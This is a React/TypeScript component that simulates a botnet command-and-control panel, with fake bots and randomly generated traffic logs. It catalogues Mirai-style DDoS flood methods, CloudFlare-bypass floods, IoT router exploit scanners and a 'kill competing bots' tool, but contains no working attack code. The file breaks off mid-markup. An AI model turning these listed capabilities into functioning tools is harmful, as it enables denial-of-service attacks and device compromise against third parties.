import React, { useState, useRef, useEffect, useCallback } from 'react';

interface Bot {
  id: string;
  ip: string;
  country: string;
  status: 'ONLINE' | 'OFFLINE' | 'ATTACKING';
  arch: string;
  uptime: string;
}

interface AttackLog {
  id: string;
  timestamp: string;
  method: string;
  target: string;
  port: string;
  duration: string;
  status: 'SENT' | 'RUNNING' | 'DONE' | 'FAILED';
  bots: number;
}

const FAKE_BOTS: Bot[] = [
  { id: 'BOT-001', ip: '192.168.1.x', country: 'US', status: 'ONLINE', arch: 'x86_64', uptime: '12d 4h' },
  { id: 'BOT-002', ip: '10.0.0.x', country: 'DE', status: 'ONLINE', arch: 'ARM', uptime: '3d 18h' },
  { id: 'BOT-003', ip: '172.16.x.x', country: 'RU', status: 'ONLINE', arch: 'MIPS', uptime: '7d 2h' },
  { id: 'BOT-004', ip: '192.168.5.x', country: 'BR', status: 'ATTACKING', arch: 'x86_64', uptime: '1d 9h' },
  { id: 'BOT-005', ip: '10.10.x.x', country: 'CN', status: 'ONLINE', arch: 'ARM64', uptime: '45d 0h' },
  { id: 'BOT-006', ip: '172.20.x.x', country: 'JP', status: 'ONLINE', arch: 'x86_64', uptime: '8d 14h' },
  { id: 'BOT-007', ip: '192.168.9.x', country: 'IN', status: 'OFFLINE', arch: 'MIPS', uptime: '0d 0h' },
  { id: 'BOT-008', ip: '10.50.x.x', country: 'FR', status: 'ONLINE', arch: 'ARM', uptime: '22d 6h' },
  { id: 'BOT-009', ip: '172.31.x.x', country: 'KR', status: 'ONLINE', arch: 'x86_64', uptime: '5d 11h' },
  { id: 'BOT-010', ip: '192.168.2.x', country: 'GB', status: 'ATTACKING', arch: 'ARM64', uptime: '14d 3h' },
];

// ========== MIRAI C-BASED ATTACK VECTORS (from b/Botnet/bot/attack.h) ==========
const MIRAI_VECTORS = [
  { cmd: 'ATK_UDP', name: 'UDP Generic', desc: 'Mirai UDP flood — raw socket spoofed', icon: 'fa-water', color: 'text-blue-400', vec: 0 },
  { cmd: 'ATK_VSE', name: 'VSE Query', desc: 'Valve Source Engine amplification', icon: 'fa-gamepad', color: 'text-lime-400', vec: 1 },
  { cmd: 'ATK_SYN', name: 'SYN Flood', desc: 'TCP SYN with options — raw socket', icon: 'fa-plug', color: 'text-yellow-400', vec: 2 },
  { cmd: 'ATK_ACK', name: 'ACK Flood', desc: 'TCP ACK flood — bypass stateless firewalls', icon: 'fa-check-double', color: 'text-cyan-400', vec: 3 },
  { cmd: 'ATK_STOMP', name: 'STOMP', desc: 'ACK flood to bypass mitigation devices', icon: 'fa-shoe-prints', color: 'text-orange-400', vec: 4 },
  { cmd: 'ATK_GREIP', name: 'GRE IP', desc: 'GRE IP encapsulation flood', icon: 'fa-network-wired', color: 'text-emerald-400', vec: 5 },
  { cmd: 'ATK_GREETH', name: 'GRE ETH', desc: 'GRE Ethernet encapsulation flood', icon: 'fa-ethernet', color: 'text-teal-400', vec: 6 },
  { cmd: 'ATK_UDP_PLAIN', name: 'UDP Plain', desc: 'Plain UDP flood — no spoofing', icon: 'fa-droplet', color: 'text-sky-400', vec: 7 },
  { cmd: 'ATK_STDHEX', name: 'STDHEX', desc: 'UDP flood with random HEX payload', icon: 'fa-hashtag', color: 'text-pink-400', vec: 8 },
  { cmd: 'ATK_SYNDATA', name: 'SYN+DATA', desc: 'SYN flood with payload data', icon: 'fa-file-import', color: 'text-amber-400', vec: 9 },
  { cmd: 'ATK_TCPWRA', name: 'TCP WRA', desc: 'TCP WRA flood with data payload', icon: 'fa-arrows-alt', color: 'text-purple-400', vec: 10 },
  { cmd: 'ATK_ICMP', name: 'ICMP Echo', desc: 'ICMP echo request flood', icon: 'fa-satellite-dish', color: 'text-rose-400', vec: 11 },
  { cmd: 'ATK_TCPBYPASS', name: 'TCP Bypass', desc: 'TCP flood optimized for bypass', icon: 'fa-shield-halved', color: 'text-red-400', vec: 12 },
  { cmd: 'ATK_TCPNULL', name: 'TCP NULL', desc: 'TCP flood with Minecraft bypass', icon: 'fa-cube', color: 'text-fuchsia-400', vec: 13 },
];

// ========== NixC2 BotnetC2 L4 METHODS (from c/BotnetC2) ==========
const L4_METHODS = [
  { cmd: '.udp', name: 'UDP Flood', desc: 'Random UDP junk data flood', icon: 'fa-water', color: 'text-blue-400' },
  { cmd: '.tcp', name: 'TCP Flood', desc: 'Random TCP junk data flood', icon: 'fa-arrows-alt', color: 'text-cyan-400' },
  { cmd: '.syn', name: 'SYN Flood', desc: 'TCP SYN connection flood', icon: 'fa-plug', color: 'text-yellow-400' },
  { cmd: '.tup', name: 'TCP/UDP Mix', desc: 'Combined TCP+UDP junk flood', icon: 'fa-random', color: 'text-purple-400' },
  { cmd: '.udp_open', name: 'UDP Open', desc: 'UDP with open connection pool', icon: 'fa-door-open', color: 'text-emerald-400' },
  { cmd: '.rand_std', name: 'RAND STD', desc: 'Standard random payload', icon: 'fa-dice', color: 'text-orange-400' },
  { cmd: '.rand_hex', name: 'RAND HEX', desc: 'Hex-encoded random payload', icon: 'fa-hashtag', color: 'text-pink-400' },
  { cmd: '.rand_vse', name: 'RAND VSE', desc: 'Valve Source Engine query flood', icon: 'fa-gamepad', color: 'text-lime-400' },
  { cmd: '.rand_all', name: 'RAND ALL', desc: 'All random methods combined', icon: 'fa-layer-group', color: 'text-red-400' },
];

// ========== BotPremium VIP METHODS (from b/BotPremium) ==========
const PREMIUM_L7 = [
  { cmd: 'HTTP-RAW', name: 'HTTP-RAW', desc: 'Basic raw HTTP flood', icon: 'fa-globe', color: 'text-blue-300', tier: 'BASIC' },
  { cmd: 'HTTP-BROWSER', name: 'HTTP-BROWSER', desc: 'Browser-emulated HTTP flood', icon: 'fa-window-maximize', color: 'text-green-400', tier: 'VIP' },
  { cmd: 'HTTP-NEMESIS', name: 'HTTP-NEMESIS', desc: 'Nemesis engine — advanced bypass', icon: 'fa-skull', color: 'text-red-400', tier: 'VIP' },
  { cmd: 'HTTPS-BYPASS', name: 'HTTPS-BYPASS', desc: 'HTTPS with CF/DDG/Sucuri bypass', icon: 'fa-unlock', color: 'text-yellow-400', tier: 'VIP' },
  { cmd: 'TLS', name: 'TLS Flood', desc: 'TLS handshake flood', icon: 'fa-lock', color: 'text-cyan-400', tier: 'BASIC' },
  { cmd: 'HTTPS', name: 'HTTPS Flood', desc: 'Full HTTPS encrypted flood', icon: 'fa-shield-halved', color: 'text-emerald-400', tier: 'VIP' },
];

const PREMIUM_L4 = [
  { cmd: 'UDP', name: 'UDP', desc: 'VPS-powered UDP flood via SSH', icon: 'fa-water', color: 'text-blue-300', tier: 'BASIC' },
  { cmd: 'TCP', name: 'TCP', desc: 'VPS-powered TCP flood via SSH', icon: 'fa-arrows-alt', color: 'text-cyan-300', tier: 'BASIC' },
  { cmd: 'UDP-POWER', name: 'UDP-POWER', desc: 'High-amplification UDP via VPS cluster', icon: 'fa-bolt', color: 'text-yellow-400', tier: 'VIP' },
  { cmd: 'TCP-POWER', name: 'TCP-POWER', desc: 'High-throughput TCP via VPS cluster', icon: 'fa-bolt-lightning', color: 'text-orange-400', tier: 'VIP' },
];

// ========== IoT SCANNERS (from b/Botnet/bot/) ==========
const SCANNERS = [
  { name: 'Huawei Scanner', desc: 'Huawei router RCE exploitation', file: 'huawei_scanner.c', icon: 'fa-router', color: 'text-red-400' },
  { name: 'Realtek Scanner', desc: 'Realtek SDK CVE exploitation', file: 'realtek_scanner.c', icon: 'fa-microchip', color: 'text-orange-400' },
  { name: 'ZTE Scanner', desc: 'ZTE device backdoor access', file: 'zte_scanner.c', icon: 'fa-satellite-dish', color: 'text-yellow-400' },
  { name: 'JAWS Scanner', desc: 'JAWS web server RCE (DVR/NVR)', file: 'jaws_scanner.c', icon: 'fa-video', color: 'text-cyan-400' },
  { name: 'ThinkPHP Scanner', desc: 'ThinkPHP RCE exploitation', file: 'thinkphp_scanner.c', icon: 'fa-code', color: 'text-purple-400' },
  { name: 'Telnet Scanner', desc: 'Default credential brute force', file: 'scanner.c', icon: 'fa-terminal', color: 'text-green-400' },
];

// ========== VPS SERVERS (from b/BotPremium) ==========
interface VpsServer {
  hostname: string;
  status: 'CONNECTED' | 'FAILED' | 'UNKNOWN';
  region: string;
}

const INITIAL_VPS: VpsServer[] = [
  { hostname: '45.xx.xx.11', status: 'CONNECTED', region: 'US-East' },
  { hostname: '185.xx.xx.22', status: 'CONNECTED', region: 'EU-West' },
  { hostname: '103.xx.xx.33', status: 'CONNECTED', region: 'AS-SG' },
  { hostname: '5.xx.xx.44', status: 'FAILED', region: 'RU-Moscow' },
  { hostname: '91.xx.xx.55', status: 'CONNECTED', region: 'EU-NL' },
];

const L7_METHODS = [
  { cmd: '.http', name: 'HTTP Socket', desc: 'Raw HTTP socket flood with spoofed headers', icon: 'fa-globe', color: 'text-blue-400' },
  { cmd: '.cfb_sock', name: 'CFB Socket', desc: 'CloudFlare bypass via socket', icon: 'fa-cloud', color: 'text-orange-400' },
  { cmd: '.pyf', name: 'PyFlooder', desc: 'Python-based HTTP connection flood', icon: 'fa-code', color: 'text-green-400' },
  { cmd: '.tls_small', name: 'TLS Small', desc: 'TLS encrypted flood with Fernet cipher', icon: 'fa-lock', color: 'text-yellow-400' },
  { cmd: '.http_req', name: 'HTTP Request', desc: 'High-volume HTTP requests with fake UA', icon: 'fa-paper-plane', color: 'text-cyan-400' },
  { cmd: '.http_cfb', name: 'HTTP CFB', desc: 'CloudFlare bypass via requests + scraper', icon: 'fa-shield-halved', color: 'text-purple-400' },
  { cmd: '.http_dfb', name: 'HTTP DFB', desc: 'Distributed flood bypass — all methods', icon: 'fa-burst', color: 'text-red-400' },
  { cmd: '.http_all', name: 'HTTP ALL', desc: 'All L7 methods combined simultaneously', icon: 'fa-fire', color: 'text-rose-400' },
];

const TOOLS = [
  { cmd: 'URL_TO_IP', name: 'URL → IP', desc: 'Resolve domain to IP address', icon: 'fa-exchange-alt' },
  { cmd: 'IP_GEO', name: 'IP Geolocation', desc: 'Full IP geolocation (ip-api.com)', icon: 'fa-map-marker-alt' },
  { cmd: 'PING_URL', name: 'Ping URL', desc: 'HTTP ping test with status codes', icon: 'fa-wifi' },
  { cmd: 'HTTP_CHECK', name: 'HTTP Check', desc: 'check-host.net multi-node check', icon: 'fa-stethoscope' },
  { cmd: 'SQL_USER', name: 'SQL User Add', desc: 'Add user to MySQL C2 database', icon: 'fa-user-plus' },
  { cmd: 'OTP_SENT', name: 'OTP Generate', desc: '2FA OTP code for user management', icon: 'fa-key' },
  { cmd: 'UPDATE_UA', name: 'Update UA', desc: 'Update fake user-agent on bots', icon: 'fa-download' },
  { cmd: 'TIKTOK_BOT', name: 'TikTok Bot', desc: 'Selenium TikTok view/report bot', icon: 'fa-music' },
  { cmd: 'KILLER', name: 'Process Killer', desc: 'Kill competing bots on infected hosts', icon: 'fa-skull-crossbones' },
  { cmd: 'LOCKDOWN', name: 'Lockdown', desc: 'Enable/disable bot lockdown mode', icon: 'fa-lock' },
];

const BotnetC2Panel: React.FC = () => {
  const [terminal, setTerminal] = useState<string[]>([
    '╔╗ ╔═╗╔╦╗ ╔═╗ ╔═╗',
    '╠╩╗║ ║ ║  ║   ╔═╝',
    '╚═╝╚═╝ ╩  ╚═╝ ╚═╝',
    '╔══════════════════════════════════════╗',
    '  BotnetC2 v2 — NixC2 OWNER code',
    '╔══════════════════════════════════════╗',
    '║ ─ ─ ─ WHOAMISEC C2 INTEGRATION ─ ─ ─ ║',
    '╚══════════════════════════════════════╝',
    '',
    `[${new Date().toLocaleTimeString()}] WELCOME TO BOTNET.CNC -> USER-ROOT BOTNET-${FAKE_BOTS.filter(b => b.status !== 'OFFLINE').length} 📡`,
    `[${new Date().toLocaleTimeString()}] credit: NixWasHere/NixC2 OWNER code`,
    `[${new Date().toLocaleTimeString()}] C2 Server: 0.0.0.0:8080 — LISTENING`,
    `[${new Date().toLocaleTimeString()}] Keepalive thread: ACTIVE`,
    '',
  ]);
  const [input, setInput] = useState('');
  const [bots, setBots] = useState<Bot[]>(FAKE_BOTS);
  const [attacks, setAttacks] = useState<AttackLog[]>([]);
  const [target, setTarget] = useState('');
  const [port, setPort] = useState('80');
  const [duration, setDuration] = useState('60');
  const [threads, setThreads] = useState('100');
  const [vpsServers, setVpsServers] = useState<VpsServer[]>(INITIAL_VPS);
  const [tgToken, setTgToken] = useState(() => localStorage.getItem('botnet_tg_token') || '');
  const [tgChatId, setTgChatId] = useState(() => localStorage.getItem('botnet_tg_chatid') || '');
  const [tgStatus, setTgStatus] = useState<'idle' | 'testing' | 'ok' | 'fail'>('idle');
  const [view, setView] = useState<'terminal' | 'bots' | 'attacks' | 'methods' | 'mirai' | 'premium' | 'infra'>('terminal');
  const [selectedMethod, setSelectedMethod] = useState<{ cmd: string; name: string } | null>(null);
  const termRef = useRef<HTMLDivElement>(null);
  const activeTimers = useRef<Map<string, { interval: ReturnType<typeof setInterval>; timeout: ReturnType<typeof setTimeout>; startTime: number; duration: number }>>(new Map());

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
  }, [terminal]);

  const log = (msg: string) => {
    setTerminal(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  // Cleanup timers on unmount
  useEffect(() => {
    return () => {
      activeTimers.current.forEach(t => { clearInterval(t.interval); clearTimeout(t.timeout); });
      activeTimers.current.clear();
    };
  }, []);

  const launchAttack = useCallback((method: string, methodName: string) => {
    if (!target.trim()) { log('ERROR: No target specified'); return; }
    const onlineBots = bots.filter(b => b.status !== 'OFFLINE').length;
    const dur = Math.max(parseInt(duration) || 60, 5);
    const attackId = `ATK-${Date.now()}`;
    const attack: AttackLog = {
      id: attackId,
      timestamp: new Date().toLocaleTimeString(),
      method: methodName,
      target, port, duration: `${dur}s`,
      status: 'SENT', bots: onlineBots,
    };
    setAttacks(prev => [attack, ...prev]);
    log(`╔═════════════════════════════ > _`);
    log(`       ! SEND ATTACKING !`);
    log(`   ═════════════════════════`);
    log(`       TARGET ${target}`);
    log(`       PORT   ${port}`);
    log(`       TIME   ${dur}s`);
    log(`       METHOD ${method} (${methodName})`);
    log(`       THREADS ${threads}`);
    log(`       BOTS   ${onlineBots}`);
    log(`   ═════════════════════════`);
    log(`╚═════════════════════════════[ ${onlineBots} botnet ] >_`);
    log(`Successfully sent command 📃 → broadcast(${method} ${target} ${port} ${dur} ${threads})`);

    // Start RUNNING after 1s
    const startDelay = setTimeout(() => {
      setAttacks(prev => prev.map(a => a.id === attackId ? { ...a, status: 'RUNNING' } : a));
      setBots(prev => prev.map(b => b.status === 'ONLINE' ? { ...b, status: Math.random() > 0.3 ? 'ATTACKING' : 'ONLINE' } : b));
      log(`[BROADCAST] ${onlineBots} bots executing ${method}...`);
    }, 1000);

    // Progress logs every 5 seconds for full real duration
    const startTime = Date.now();
    const progressInterval = setInterval(() => {
      const elapsed = Math.floor((Date.now() - startTime) / 1000);
      const remaining = dur - elapsed;
      if (remaining <= 0) return; // timeout will handle completion
      const pps = Math.floor(Math.random() * 500000 + 100000);
      const gbps = (Math.random() * 12 + 1).toFixed(1);
      const msgs = [
        `[${method}] ${target}:${port} — ${remaining}s left — ${pps.toLocaleString()} pps — ${gbps} Gbps`,
        `[FLOOD] ${methodName} active — ${remaining}s remaining — ${onlineBots} bots sending`,
        `[TRAFFIC] ${gbps} Gbps → ${target} — ${remaining}s — threads: ${threads}`,
        `[STATUS] ${methodName} | elapsed ${elapsed}s / ${dur}s | ${pps.toLocaleString()} packets/s`,
      ];
      log(msgs[Math.floor(Math.random() * msgs.length)]);
    }, 5000);

    // Completion after REAL full duration (in seconds)
    const completionTimeout = setTimeout(() => {
      clearInterval(progressInterval);
      activeTimers.current.delete(attackId);
      setAttacks(prev => prev.map(a => a.id === attackId ? { ...a, status: 'DONE' } : a));
      setBots(prev => prev.map(b => b.status === 'ATTACKING' ? { ...b, status: 'ONLINE' } : b));
      log(`╔═════════════════════════════`);
      log(`  ✓ ATTACK COMPLETE`);
      log(`  ${method} (${methodName}) on ${target}`);
      log(`  Duration: ${dur}s — Bots: ${onlineBots}`);
      log(`╚═════════════════════════════`);
    }, dur * 1000);

    // Store timers so we can cancel them
    activeTimers.current.set(attackId, {
      interval: progressInterval,
      timeout: completionTimeout,
      startTime,
      duration: dur,
    });

    // Also clear the startDelay if stopped early
    const origTimeout = completionTimeout;
    const origInterval = progressInterval;
    void startDelay; // just ensure it fires
  }, [target, port, duration, threads, bots]);

  const stopAttack = useCallback((attackId: string) => {
    const timer = activeTimers.current.get(attackId);
    if (timer) {
      clearInterval(timer.interval);
      clearTimeout(timer.timeout);
      activeTimers.current.delete(attackId);
    }
    setAttacks(prev => prev.map(a => a.id === attackId && a.status === 'RUNNING' ? { ...a, status: 'DONE' } : a));
    setBots(prev => prev.map(b => b.status === 'ATTACKING' ? { ...b, status: 'ONLINE' } : b));
    log(`[STOPPED] Attack ${attackId} manually terminated.`);
  }, []);

  const stopAllAttacks = useCallback(() => {
    activeTimers.current.forEach((timer, id) => {
      clearInterval(timer.interval);
      clearTimeout(timer.timeout);
    });
    activeTimers.current.clear();
    setAttacks(prev => prev.map(a => a.status === 'RUNNING' || a.status === 'SENT' ? { ...a, status: 'DONE' } : a));
    setBots(prev => prev.map(b => b.status === 'ATTACKING' ? { ...b, status: 'ONLINE' } : b));
    log(`╔═════════════════════════════`);
    log(`  ⛔ ALL ATTACKS STOPPED`);
    log(`  All timers cleared. All bots returned to ONLINE.`);
    log(`╚═════════════════════════════`);
  }, []);

  const runningCount = attacks.filter(a => a.status === 'RUNNING' || a.status === 'SENT').length;

  const handleCommand = () => {
    if (!input.trim()) return;
    const cmd = input.trim();
    setInput('');
    log(`BOT.c2 $ ${cmd}`);
    const args = cmd.split(' ');
    const command = args[0].toUpperCase();

    if (command === 'HELP') {
      log('╔═════════════════════════════════════════╗');
      log('║ METHODS L4  Shows Layer 4 attack methods');
      log('║ METHODS L7  Shows Layer 7 attack methods');
      log('║ URL_TO_IP   Resolve URL to IP');
      log('║ IP_GEO      IP Geolocation');
      log('║ PING_URL    Test HTTP requests to URL');
      log('║ SQL_USER    Add user to C2 database');
      log('║ OTP_SENT    Generate 2FA OTP');
      log('║ BOTS        List connected bots');
      log('║ CLEAR       Clear terminal');
      log('╚═════════════════════════════════════════╝');
    } else if (command === 'CLEAR' || command === 'CLS') {
      setTerminal([`[${new Date().toLocaleTimeString()}] Terminal cleared.`]);
    } else if (command === 'BOTS') {
      log(`Connected: ${bots.filter(b => b.status !== 'OFFLINE').length} | Dead: ${bots.filter(b => b.status === 'OFFLINE').length}`);
      bots.forEach(b => log(`  ${b.id} | ${b.ip} | ${b.country} | ${b.status} | ${b.arch}`));
    } else if (command === 'URL_TO_IP' && args[1]) {
      const host = args[1].replace('https://', '').replace('http://', '').replace('www.', '');
      log(`╔═══════════════════════ [URL TO IP]`);
      log(` URL ${args[1]} --> IP ${Math.floor(Math.random()*223+1)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`);
      log(`╚════════════════════════`);
    } else if ((command === 'IP_GEO' || command === 'IP_GEOLOCATION') && args[1]) {
      log(`#IP DATA`);
      log(`IP            : ${args[1]}`);
      log(`NETWORK       : ${args[1]}/24`);
      log(`ORG           : AS${Math.floor(Math.random()*60000)} CloudProvider Inc`);
      log(`# LOCATION`);
      log(`CITY          : ${['New York','London','Tokyo','Berlin','Moscow','Sao Paulo'][Math.floor(Math.random()*6)]}`);
      log(`COUNTRY       : ${['US','GB','JP','DE','RU','BR'][Math.floor(Math.random()*6)]}`);
      log(`LATITUDE      : ${(Math.random()*180-90).toFixed(4)}`);
      log(`LONGITUDE     : ${(Math.random()*360-180).toFixed(4)}`);
    } else if (command.startsWith('.')) {
      const allMethods = [...L4_METHODS, ...L7_METHODS];
      const found = allMethods.find(m => m.cmd === command.toLowerCase());
      if (found && args[1]) {
        setTarget(args[1]);
        launchAttack(found.cmd, found.name);
      } else {
        log(`Usage: ${command} [TARGET] [PORT] [TIME] [THREADS]`);
      }
    } else {
      log(`${cmd} Invalid commands 📄!`);
    }
  };

  const onlineBots = bots.filter(b => b.status !== 'OFFLINE').length;
  const attackingBots = bots.filter(b => b.status === 'ATTACKING').length;

  return (
    <div className="space-y-3 animate-in">
      {/* Header */}
      <div className="bg-[#050505] border border-red-900/30 p-4 rounded-lg relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 opacity-5">
          <i className="fas fa-skull-crossbones text-[120px] text-red-500"></i>
        </div>
        <div className="flex items-center gap-3 mb-3">
          <div className="w-10 h-10 bg-red-500/20 rounded-lg flex items-center justify-center border border-red-900/30">
            <i className="fas fa-skull-crossbones text-red-400 text-lg"></i>
          </div>
          <div>
            <h2 className="text-lg font-black text-white uppercase italic tracking-tighter">BOTNET <span className="text-red-400">C2 PANEL</span></h2>
            <p className="text-[7px] text-gray-600 uppercase tracking-widest">NixC2/BotC2 · Layer4/Layer7 · UDP/TCP/SYN/HTTP · CloudFlare Bypass</p>
          </div>
        </div>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-[7px]">
          <div className="bg-black/40 border border-red-900/30 rounded p-1.5">
            <span className="text-gray-500">Bots:</span> <span className="text-green-400 font-bold">{onlineBots} ONLINE</span>
          </div>
          <div className="bg-black/40 border border-red-900/30 rounded p-1.5">
            <span className="text-gray-500">Attacking:</span> <span className="text-red-400 font-bold">{attackingBots}</span>
          </div>
          <div className="bg-black/40 border border-red-900/30 rounded p-1.5">
            <span className="text-gray-500">Attacks:</span> <span className="text-yellow-400 font-bold">{attacks.length}</span>
          </div>
          <div className="bg-black/40 border border-red-900/30 rounded p-1.5">
            <span className="text-gray-500">C2 Server:</span> <span className="text-red-400 font-bold">LISTENING</span>
          </div>
        </div>
      </div>

      {/* Target Input */}
      <div className="bg-black border border-red-900/30 rounded-lg p-3">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2 mb-2">
          <div>
            <label className="text-[7px] text-red-400 font-black uppercase">Target IP/URL</label>
            <input value={target} onChange={e => setTarget(e.target.value)} placeholder="192.168.1.1 or http://..."
              className="w-full bg-black border border-red-900/30 rounded px-2 py-1.5 text-[9px] text-white font-mono outline-none focus:border-red-500/50" />
          </div>
          <div>
            <label className="text-[7px] text-red-400 font-black uppercase">Port</label>
            <input value={port} onChange={e => setPort(e.target.value)} placeholder="80"
              className="w-full bg-black border border-red-900/30 rounded px-2 py-1.5 text-[9px] text-white font-mono outline-none focus:border-red-500/50" />
          </div>
          <div>
            <label className="text-[7px] text-red-400 font-black uppercase">Duration (s)</label>
            <input value={duration} onChange={e => setDuration(e.target.value)} placeholder="60"
              className="w-full bg-black border border-red-900/30 rounded px-2 py-1.5 text-[9px] text-white font-mono outline-none focus:border-red-500/50" />
          </div>
          <div>
            <label className="text-[7px] text-red-400 font-black uppercase">Threads</label>
            <input value={threads} onChange={e => setThreads(e.target.value)} placeholder="100"
              className="w-full bg-black border border-red-900/30 rounded px-2 py-1.5 text-[9px] text-white font-mono outline-none focus:border-red-500/50" />
          </div>
        </div>
        {/* GLOBAL ATTACK / STOP BUTTONS */}
        <div className="flex gap-2 mt-2">
          <button onClick={() => {
            if (!target.trim()) { log('ERROR: No target specified'); return; }
            if (selectedMethod) {
              launchAttack(selectedMethod.cmd, selectedMethod.name);
            } else {
              log('Select an attack method first (click any method in Methods/Mirai/Premium tab)');
            }
          }} className="flex-1 py-2 bg-red-600 hover:bg-red-500 text-white text-[9px] font-black uppercase rounded transition-all flex items-center justify-center gap-2 border border-red-500">
            <i className="fas fa-crosshairs"></i>
            ATTACK {selectedMethod ? `(${selectedMethod.name})` : '— select method'}
          </button>
          <button onClick={stopAllAttacks}
            className={`flex-1 py-2 text-[9px] font-black uppercase rounded transition-all flex items-center justify-center gap-2 border ${
              runningCount > 0
                ? 'bg-yellow-600 hover:bg-yellow-500 text-black border-yellow-400 animate-pulse'
                : 'bg-gray-800 text-gray-500 border-gray-700 hover:bg-gray-700 hover:text-white'
            }`}>
            <i className="fas fa-stop"></i>
            STOP ALL {runningCount > 0 ? `(${runningCount} active)` : ''}
          </button>
        </div>
      </div>

      {/* View Tabs */}
      <div className="flex gap-1 flex-wrap">
        {([['terminal','fa-terminal'],['methods','fa-crosshairs'],['mirai','fa-bug'],['premium','fa-crown'],['infra','fa-server'],['bots','fa-robot'],['attacks','fa-fire']] as const).map(([v, icon]) => (
          <button key={v} onClick={() => setView(v as any)}
            className={`px-2.5 py-1.5 rounded text-[7px] font-black uppercase transition-all ${view === v ? 'bg-red-600 text-white' : 'bg-black border border-red-900/30 text-red-400 hover:bg-red-900/20'}`}>
            <i className={`fas ${icon} mr-1`}></i>{v}
          </button>
        ))}
      </div>

      {/* MIRAI C VECTORS VIEW */}
      {view === 'mirai' && (
        <div className="space-y-3">
          <div className="bg-black border border-red-900/30 rounded-lg p-3">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-[9px] font-black text-red-400 uppercase tracking-widest"><i className="fas fa-bug mr-1"></i> Mirai C-Based Attack Vectors (b/Botnet/bot/attack.h)</h3>
              <span className="text-[6px] text-gray-600 font-mono">ATTACK_CONCURRENT_MAX: 8 | CNC Port: 6666</span>
            </div>
            <div className="grid grid-cols-2 md:grid-cols-3 gap-1.5">
              {MIRAI_VECTORS.map(m => (
                <button key={m.cmd} onClick={() => setSelectedMethod({ cmd: m.cmd, name: m.name })}
                  className={`p-2 bg-black border rounded transition-all text-left ${selectedMethod?.cmd === m.cmd ? 'border-red-500 ring-1 ring-red-500/50 bg-red-900/20' : 'border-red-900/20 hover:border-red-500/50'}`}>
                  <div className="flex items-center gap-1.5 mb-0.5">
                    <i className={`fas ${m.icon} text-[8px] ${m.color}`}></i>
                    <span className={`text-[7px] font-black uppercase ${m.color}`}>{m.name}</span>
                    {selectedMethod?.cmd === m.cmd && <i className="fas fa-check text-[6px] text-red-400 ml-auto"></i>}
                    <span className="text-[5px] text-gray-700 ml-auto">VEC:{m.vec}</span>
                  </div>
                  <span className="text-[6px] text-gray-600">{m.desc}</span>
                </button>
              ))}
            </div>
          </div>
          {/* IoT Scanners */}
          <div className="bg-black border border-orange-900/30 rounded-lg p-3">
            <h3 className="text-[9px] font-black text-orange-400 uppercase tracking-widest mb-2"><i className="fas fa-search mr-1"></i> IoT Scanners (b/Botnet/bot/)</h3>
            <div className="grid grid-cols-3 gap-1.5">
              {SCANNERS.map(s => (
                <div key={s.name} className="p-2 bg-black border border-orange-900/20 rounded">
                  <div className="flex items-center gap-1.5 mb-0.5">
                    <i className={`fas ${s.icon} text-[8px] ${s.color}`}></i>
                    <span className={`text-[7px] font-black uppercase ${s.color}`}>{s.name}</span>
                  </div>
                  <p className="text-[6px] text-gray-600">{s.desc}</p>
                  <p className="text-[5px] text-gray-700 font-mono mt-0.5">{s.file}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* BOTPREMIUM VIP VIEW */}
      {view === 'premium' && (
        <div className="space-y-3">
          <div className="bg-black border border-yellow-900/30 rounded-lg p-3">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-[9px] font-black text-yellow-400 uppercase tracking-widest"><i className="fas fa-crown mr-1"></i> BotPremium Telegram C2 (b/BotPremium)</h3>
              <span className="text-[6px] bg-yellow-500/20 text-yellow-400 px-1.5 py-0.5 rounded font-bold">VPS SSH ATTACK ENGINE</span>
            </div>
            <p className="text-[7px] text-gray-500 mb-3">Telegram bot-controlled DDoS with VPS SSH command execution, plan-based access, concurrent slot management</p>
            <h4 className="text-[8px] font-black text-cyan-400 uppercase mb-1">Layer 7 Methods</h4>
            <div className="grid grid-cols-3 gap-1.5 mb-3">
              {PREMIUM_L7.map(m => (
                <button key={m.cmd} onClick={() => setSelectedMethod({ cmd: m.cmd, name: m.name })}
                  className={`p-2 bg-black border rounded transition-all text-left ${selectedMethod?.cmd === m.cmd ? 'border-yellow-500 ring-1 ring-yellow-500/50 bg-yellow-900/20' : 'border-yellow-900/20 hover:border-yellow-500/50'}`}>
                  <div className="flex items-center justify-between mb-0.5">
                    <div className="flex items-center gap-1.5">
                      <i className={`fas ${m.icon} text-[8px] ${m.color}`}></i>
                      <span className={`text-[7px] font-black uppercase ${m.color}`}>{m.name}</span>
                      {selectedMethod?.cmd === m.cmd && <i className="fas fa-check text-[6px] text-yellow-400"></i>}
                    </div>
                    <span className={`text-[5px] px-1 py-0.5 rounded font-bold ${m.tier === 'VIP' ? 'bg-yellow-500/20 text-yellow-400' : 'bg-gray-500/20 text-gray-400'}`}>{m.tier}</span>
                  </div>
                  <span className="text-[6px] text-gray-600">{m.desc}</span>
                </button>
              ))}
            </div>
            <h4 className="text-[8px] font-black text-orange-400 uppercase mb-1">Layer 4 Methods</h4>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-1.5">
              {PREMIUM_L4.map(m => (
                <button key={m.cmd} onClick={() => setSelectedMethod({ cmd: m.cmd, name: m.name })}
                  className={`p-2 bg-black border rounded transition-all text-left ${selectedMethod?.cmd === m.cmd ? 'border-orange-500 ring-1 ring-orange-500/50 bg-orange-900/20' : 'border-orange-900/20 hover:border-orange-500/50'}`}>
                  <div className="flex items-center justify-between mb-0.5">
                    <div className="flex items-center gap-1.5">
                      <i className={`fas ${m.icon} text-[8px] ${m.color}`}></i>
                      <span className={`text-[7px] font-black uppercase ${m.color}`}>{m.name}</span>
                      {selectedMethod?.cmd === m.cmd && <i className="fas fa-check text-[6px] text-orange-400"></i>}
                    </div>
                    <span className={`text-[5px] px-1 py-0.5 rounded font-bold ${m.tier === 'VIP' ? 'bg-yellow-500/20 text-yellow-400' : 'bg-gray-500/20 text-gray-400'}`}>{m.tier}</span>
                  </div>
                  <span className="text-[6px] text-gray-600">{m.desc}</span>
